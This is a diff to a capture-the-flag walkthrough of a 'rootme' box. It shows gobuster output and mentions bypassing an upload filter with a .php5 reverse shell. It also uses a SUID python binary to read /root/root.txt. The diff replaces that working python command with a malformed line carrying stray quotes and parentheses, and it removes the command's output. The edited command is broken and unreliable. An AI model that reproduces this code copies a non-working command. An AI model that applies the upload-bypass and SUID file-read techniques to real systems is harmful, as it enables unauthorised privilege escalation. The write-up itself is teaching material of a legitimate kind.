@@ -58,8 +58,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /js                   (Status: 301) [Size: 307] [--> http://10.10.11.81/js/] 
 /panel                (Status: 301) [Size: 310] [--> http://10.10.11.81/panel/]
 /server-status        (Status: 403) [Size: 276]                                
-/uploads              (Status: 301) [Size: 312] [-->
-http://10.10.11.81/uploads/]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.11.81/uploads/]
                                                                                  
 ===============================================================
 2021/03/22 19:37:38 Finished
@@ -79,7 +78,7 @@ After reading this post [on bypassing file upload
 restrictions](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)
 I found a solution.
 
-I editted my php reverse shell to have a .php5 file extension and was able to
+I edited my php reverse shell to have a .php5 file extension and was able to
 get a reverse shell.
 
 ```
@@ -132,13 +131,12 @@ www-data@rootme:/var/www$ find / -perm -u=s -type f 2>/dev/null
 There's a ton of output, but the file that immediately stood out to me was
 /usr/bin/python.
 
+### Finding root.txt
+
 Using [this GTFObin
 syntax](https://gtfobins.github.io/gtfobins/python/#file-read) we can read the
 root file!
 
 ```
-www-data@rootme:/var/www$ python -c 'print(open("/root/root.txt").read())'
-XXX-REDACTED-XXX
+www-data@rootme:/var/www$ python -c 'print(open("/root/root.txt").read())'')""))'
 ```
-
-That was a fun box!
